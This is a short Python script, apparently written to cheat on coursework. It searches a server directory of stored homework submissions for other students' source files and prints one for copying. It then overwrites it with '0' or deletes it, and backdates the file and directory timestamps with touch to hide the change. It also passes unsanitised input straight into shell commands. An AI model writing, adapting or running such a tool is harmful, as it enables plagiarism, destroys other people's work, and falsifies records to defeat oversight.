#!/usr/bin/env python
# Version 1.3
# by R, free license.
import os, sys, shutil

do_not_delete_while_debug=False
doRewrite = True

if len(sys.argv) < 2:
    print('Usage: python3 do.py <input file name> [-d --delete:Delete src code rather than rewrite]')
    exit(1)

if sys.argv[2] == '-d' or sys.argv[2] == '--delete':
    doRewrite = False

def runCmd(cmd):
    return os.popen(cmd).read().split("\n")

def doHomework(shid,lid):
    cmdToRun = "find /var/www/data/ctest2 | grep -v 'U201' | grep 's/%s' | grep '/%s/'" % (lid, shid)
    dirArr = runCmd(cmdToRun)
    if len(dirArr) == 0 or dirArr[0] == '':
        print("Error2> Failed to load hw (null dirArr) %s %s" % (shid, lid))
        return
    targetDir = dirArr[0]+'/..'
    flist = os.listdir(targetDir)
    flist.sort()
    if len(flist) == 0:
        print("Error3> Failed to find f (len(flist)=0) %s %s" % (shid, lid))
        return
    if flist[0][0:4:] == '2017':
        print("Error4> Failed to find 2016 doc (fl[0]is2017) %s %s" % (shid, lid))
        return
    targetDir += '/'
    targetDir += flist[0]
    flistBackup = flist # lazy...
    flist = os.listdir(targetDir)
    if len(flist) == 0:
        print("Error5> Failed to find src (len(srclist)=0) %s %s" % (shid, lid))
        return
    targetFileName = flist[int(len(flist)/2)]
    # 1.3 added: fileName check.
    if targetFileName[1:5] != '2015' and targetFileName[1:5] != '2014':
        print("Rejected option: %s" % targetFileName)
        if flistBackup[1][0:4:] == '2017':
            print("Forced accept last option.")
        else:
            targetDir += "/../%s" % flistBackup[1]
            flist = os.listdir(targetDir)
            targetFileName = flist[int(len(flist)/2)]
            if targetFileName[1:5] != '2015' and targetFileName[1:5] != '2014':
                print("Rejected option again: %s" % (targetDir+'/'+targetFileName))
                return
    # end 1.3
    targetDir+='/'
    print('----------ele----------')
    print(shid,'-',lid,'---Enjoy>>>>',targetFileName)
    with open(targetDir+targetFileName,"r") as fdTarget:
        srcTarget=''
        try:
            srcTarget=fdTarget.read()
        except UnicodeDecodeError:
            srcTarget=''
            print("Warning: LICENSE may included... Please use cat ./.%s after python finished." % (targetFileName))
            shutil.copy(targetDir+targetFileName, './.'+targetFileName)
    print(srcTarget)
    print('----------done---------')
    
    if doRewrite:
        eraseCmd = 'echo "0" > '
    else:
        eraseCmd = 'rm '
    if do_not_delete_while_debug:
        print('Virtual cmd >', eraseCmd+targetDir+targetFileName)
        print('Virtual cmd >', "touch -c -m -t 201604281103 %s" % (targetDir+targetFileName))
        print('Virtual cmd >', "touch -c -m -t 201604281103 %s" % (targetDir+'..'))
    else:
        os.system(eraseCmd+targetDir+targetFileName)
        os.system("touch -c -m -t 201604281103 %s" % (targetDir+targetFileName))
        os.system("touch -c -m -t 201604281103 %s" % (targetDir+'..'))
        try:
            with open(targetDir+targetFileName,"r") as fdTarget:
                if len(fdTarget.read()) > 4:
                    print("Warning: Failed to remove file %s" % (targetDir+targetFileName))
                else:
                    print("Erased %s" % (targetDir+targetFileName))
        except FileNotFoundError:
            print("Erased %s" % (targetDir+targetFileName))
    return

fileName=sys.argv[1]
inFd=open(fileName, 'r')
contArr=inFd.read().split("\n")
inFd.close()
for ps in contArr:
    if ps == '':
        continue
    arg=ps.split(' ')
    doHomework(arg[0], arg[1])
print('Done.')

